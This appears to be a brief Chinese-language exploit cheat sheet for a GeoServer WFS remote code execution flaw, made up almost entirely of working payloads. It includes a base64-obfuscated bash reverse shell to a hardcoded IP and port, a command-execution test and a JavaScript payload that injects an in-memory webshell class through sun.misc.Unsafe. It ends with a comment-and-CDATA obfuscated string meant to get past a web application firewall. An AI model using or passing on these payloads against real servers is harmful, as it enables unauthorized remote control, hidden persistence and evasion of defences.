GeoServer https://mp.weixin.qq.com/s/7FGOddQdXJsy7FF_hJAGSQ

https://github.com/pen4uin/java-memshell-generato

## 执行命令
```xml
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIzLzg4NzcgMD4mMQ==}|{base64,-d}|{bash,-i}')</wfs:valueReference>
</wfs:GetPropertyValue>
```
```xml
eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lan
g.Runtime.getRuntime().exec("open -na Calculator")')
```

## 注入内存马
```xml
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
 <wfs:Query typeNames='sf:archsites'/>
 <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManage
r.new(),'js'),'
var str="";
var bt;
try {
 bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().d
ecodeBuffer(str);
} catch (e) {
 bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredFiel
d("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), b
t, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>
```

## 绕过WAF
```xml
/+java.lang.T<!--IgnoreMe!!!!-->hread.s[(: IGNORE :)]leep&#010;&#032;&#009;<![CDATA[ (2000) ]]>
```

## 参考
https://xz.aliyun.com/t/14991?time__1311=GqAh0IqGxmxfx0v44%2BxCqM67GCCqX3x
https://m.freebuf.com/articles/web/203537.html
https://blog.csdn.net/baidu_25299117/article/details/140305513
https://cn-sec.com/archives/2921958.html


